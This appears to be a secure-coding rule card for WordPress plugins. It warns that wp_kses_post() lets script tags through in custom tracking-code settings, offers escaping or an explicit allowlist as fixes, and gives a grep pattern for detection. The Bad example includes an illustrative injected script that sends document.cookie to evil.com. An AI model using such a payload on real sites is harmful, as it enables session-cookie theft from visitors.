## Bad
```php
// Plugin settings allow custom tracking code
$custom_head = Settings::get( 'plugin', 'custom_head_code' );
echo wp_kses_post( $custom_head ); // wp_kses_post allows <script>
// â†’ Compromised admin injects: <script>fetch('evil.com?cookie='+document.cookie)</script>
```

## Good
```php
// Option 1: Strip all scripts (display only)
$custom_head = Settings::get( 'plugin', 'custom_head_code' );
echo esc_html( $custom_head );

// Option 2: Explicit allowlist (if scripts needed)
$allowed = array(
    'noscript' => array(),
    'img' => array( 'src' => true, 'height' => true, 'width' => true )
);
echo wp_kses( $custom_head, $allowed );
```

## Why
wp_kses_post() allows <script> tags. If admin account compromised, attacker can inject malicious JS via custom tracking code settings. Use wp_kses() with explicit allowed tags or escape with esc_html() for display-only.

## Grep
`\bwp_kses_post\s*\(\s*\$[a-z_]+\s*\).*(?:custom.*code|tracking|script)` — in `**/*.php`
